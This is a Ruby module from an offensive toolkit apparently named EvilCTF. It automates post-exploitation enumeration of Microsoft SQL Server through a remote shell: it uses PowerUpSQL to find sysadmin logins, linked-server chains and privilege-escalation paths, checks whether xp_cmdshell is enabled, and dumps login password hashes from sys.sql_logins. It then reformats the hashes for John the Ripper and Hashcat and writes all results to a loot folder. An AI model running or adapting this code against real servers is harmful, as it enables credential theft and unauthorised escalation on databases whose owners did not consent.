# lib/evil_ctf/sql_enum.rb

require 'fileutils'
require 'yaml'
require 'json'
require 'time'

module EvilCTF::SQLEnum
  def self.run_sql_enum(shell)
    puts "\n[*] Starting SQL Enumeration..."

    loot_dir = 'loot/sql'
    FileUtils.mkdir_p(loot_dir) unless Dir.exist?(loot_dir)

    timestamp = Time.now.utc.iso8601
    results = {}

    powerup_path = "C:\\Tools\\PowerUpSQL\\PowerUpSQL.ps1"
    using_powerup = false

    if shell.run("Test-Path '#{powerup_path}'").output.strip == "True"
      puts "[+] PowerUpSQL found. Importing..."
      shell.run("Import-Module '#{powerup_path}' -Force")
      using_powerup = true
    else
      puts "[!] PowerUpSQL not found at #{powerup_path}"
      puts "[*] To enable advanced enumeration, run: tool powerupsql"
    end

    # PowerUpSQL queries
    if using_powerup
      queries = {
        "SQL Instances (Domain)" =>
          "Get-SQLInstanceDomain | Format-Table -AutoSize",
        "Interesting Logins" =>
          "Get-SQLServerLogin -Instance localhost | Where-Object { $_.IsSysAdmin -eq $true -or $_.IsLinked -eq $true } | Format-Table -AutoSize",
        "Linked Servers" =>
          "Get-SQLServerLink -Instance localhost | Format-Table -AutoSize",
        "Linked Server Chains (Deep)" =>
          "Get-SQLServerLinkCrawl -Instance localhost | Format-Table -AutoSize",
        "Unpatched SQL Servers" =>
          "Get-SQLServerPatchStatus -Instance localhost | Format-Table -AutoSize",
        "Command Execution Check" =>
          "Get-SQLServerPrivEsc -Instance localhost | Format-Table -AutoSize",
        "Database Listing" =>
          "Get-SQLServerDatabase -Instance localhost | Format-Table -AutoSize",
        "Current User Permissions" =>
          "Get-SQLServerPermission -Instance localhost | Format-Table -AutoSize",
        "CLR Persistence Check" =>
          "Get-SQLServerCLR -Instance localhost | Format-Table -AutoSize",
        "SQL Audit Checks" =>
          "Get-SQLServerAudit -Instance localhost | Format-Table -AutoSize",
        "Privileged Roles" =>
          "Get-SQLServerRoleMember -Instance localhost | Format-Table -AutoSize",
        "xp_cmdshell Check" =>
          "Invoke-SQLQuery -Query \"SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'\" -Instance localhost | Format-Table -AutoSize"
      }

      queries.each do |label, cmd|
        puts "\n=== #{label} ==="
        begin
          result = shell.run(cmd)
          output = result.output.strip
          results[label] = output.empty? ? "[!] No output" : output
          puts results[label]
          File.write(File.join(loot_dir, "#{label.downcase.gsub(/\s+/, '_')}.txt"), output)
        rescue => e
          puts "[!] Failed #{label}: #{e.message}"
        end
      end
    end

    # sqlcmd fallback
    puts "\n[*] Checking for sqlcmd.exe..."
    sqlcmd_present = !shell.run("Get-Command sqlcmd -ErrorAction SilentlyContinue").output.strip.empty?

    if sqlcmd_present
      puts "[+] sqlcmd found. Executing fallback checks..."
      fallback = {
        "MSSQL Version"     => "sqlcmd -Q \"SELECT @@version\"",
        "Linked Servers"    => "sqlcmd -Q \"EXEC sp_linkedservers\"",
        "Current User"      => "sqlcmd -Q \"SELECT SYSTEM_USER, USER_NAME()\"",
        "Available DBs"     => "sqlcmd -Q \"SELECT name FROM sys.databases\""
      }

      fallback.each do |label, cmd|
        puts "\n=== #{label} ==="
        begin
          output = shell.run(cmd).output.strip
          results[label] = output.empty? ? "[!] No output" : output
          puts results[label]
          File.write(File.join(loot_dir, "#{label.downcase.gsub(/\s+/, '_')}.txt"), output)
        rescue => e
          puts "[!] Failed #{label}: #{e.message}"
        end
      end
    else
      puts "[!] sqlcmd.exe not available"
    end

    # SQL login hashes
    puts "\n[*] Attempting to dump SQL login hashes..."
    begin
      hash_result = shell.run("sqlcmd -Q \"SELECT name, password_hash FROM sys.sql_logins\"")
      output = hash_result.output.strip
      if output.empty?
        puts "[!] No hashes returned. Probably insufficient privileges."
      else
        puts "[+] SQL login hashes:\n#{output}"
        results["SQL Login Hashes"] = output
        File.write(File.join(loot_dir, "sql_hashes.txt"), output)

        converted = output.lines.map do |line|
          if line =~ /(.+)\s+0x([0-9A-Fa-f]+)/
            user, hex = $1.strip, $2.strip
            "#{user}:#{hex}"
          else
            nil
          end
        end.compact

        unless converted.empty?
          File.write(File.join(loot_dir, "hashes_john.txt"), converted.join("\n"))
          File.write(File.join(loot_dir, "hashes_info.txt"), <<~INFO)
            Format: MSSQL (0x-prefixed SHA1)
            Use with John the Ripper: --format=mssql
            Use with Hashcat: -m 1731
            Example: user:0100A48FAE8783F2E6AC51A...
          INFO
          puts "[+] Hashes saved and converted to hashes_john.txt"
        end
      end
    rescue => e
      puts "[!] Failed to dump hashes: #{e.message}"
    end

    # Context check
    puts "\n[*] Checking DB User Context..."
    begin
      user_info = shell.run("sqlcmd -Q \"SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')\"").output.strip
      puts "[*] User Context:\n#{user_info}"
      results["Sysadmin Access"] = user_info.include?("0") ? "NO" : "YES"
    rescue
      puts "[!] Could not determine sysadmin status"
    end

    # Save final reports
    File.write(File.join(loot_dir, "sql_enum.yaml"), results.to_yaml)
    File.write(File.join(loot_dir, "sql_enum.json"), JSON.pretty_generate(results))
    puts "\n[+] SQL Enumeration complete. Timestamp: #{timestamp}"
    puts "[+] Output saved in #{loot_dir}/"
  end
end
